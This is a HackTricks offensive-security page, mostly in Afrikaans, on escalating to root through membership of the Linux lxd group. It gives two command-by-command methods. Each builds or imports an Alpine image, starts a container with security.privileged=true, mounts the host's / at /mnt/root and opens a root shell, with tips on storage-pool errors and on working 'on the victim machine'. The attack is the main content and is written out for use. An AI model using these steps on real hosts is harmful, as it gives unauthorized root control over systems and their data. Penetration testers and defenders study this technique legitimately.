# lxd/lxc Group - Privilege escalation

{{#include ../../../banners/hacktricks-training.md}}

Lidmaatskap van die host se LXD management group (normaalweg _**lxd**_) kan 'n pad na root bied deur volle beheer oor die daemon toe te laat.<sup>[[1]](#references)</sup>

## Exploiting sonder internet

### Method 1

Jy kan 'n Alpine image aflaai om saam met LXD te gebruik vanaf 'n trusted repository.
Canonical se LXD image server publiseer daaglikse builds: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
Laai eenvoudig beide **lxd.tar.xz** en **rootfs.squashfs** van die nuutste build af (die directory-naam is die datum).<sup>[[8]](#references)</sup>

Alternatiewelik kan jy distrobuilder op jou masjien installeer deur die [project instructions](https://github.com/lxc/distrobuilder) te volg.<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>
```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```
Laai **incus.tar.xz** (**lxd.tar.xz** indien jy dit vanaf die Canonical image server afgelaai het) en **rootfs.squashfs** op, en voer dan die image in en skep ’n container.<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> Indien jy hierdie fout _**Error: No storage pool found. Please create a new storage pool**_ kry,\
> Voer **`lxd init`** uit, stel ’n verstek-bergingpoel op en **herhaal** dan die vorige blok opdragte.<sup>[[2]](#references)</sup>

Begin laastens die container en open ’n root shell op die gasheer se lêerstelsel:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### Metode 2

Bou ’n Alpine-image en begin dit met die vlag `security.privileged=true`, wat container root na host root karteer; deur `/` te mount, word die host-lêerstelsel binne die container blootgestel.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
## References

- [1] [Hoe om sekuriteit vir LXD te versterk](https://canonical.com/lxd/docs/latest/howto/security_harden/)
- [2] [LXD-houers en virtuele masjiene](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
- [3] [Hoe om images te kopieer en in te voer](https://canonical.com/lxd/docs/latest/howto/images_copy/)
- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
- [5] [Hoe om images met distrobuilder te bou](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
- [6] [Alpine image-definisie](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
- [7] [lxd-alpine-builder-bouskrip](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
- [8] [LXD image-bediener](https://images.lxd.canonical.com/)
- [9] [Tipe: disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
{{#include ../../../banners/hacktricks-training.md}}
